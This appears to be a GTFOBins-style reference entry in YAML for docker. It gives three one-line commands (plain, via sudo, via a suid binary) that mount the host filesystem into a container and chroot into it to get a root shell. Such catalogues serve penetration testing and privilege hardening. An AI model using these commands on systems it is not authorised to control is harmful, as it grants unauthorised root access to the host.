---
description: |
  This requires the user to be privileged enough to run docker, i.e. being in the `docker` group or being `root`.
functions:
  shell:
    - description: Any other Docker Linux image should work, e.g., `debian`. The resulting is a root shell.
      code: docker run -v /:/mnt --rm -it alpine chroot /mnt sh
  sudo:
    - description: Any other Docker Linux image should work, e.g., `debian`. The resulting is a root shell.
      code: sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
  suid:
    - description: Any other Docker Linux image should work, e.g., `debian`. The resulting is a root shell.
      code: ./docker run -v /:/mnt --rm -it alpine chroot /mnt sh
---
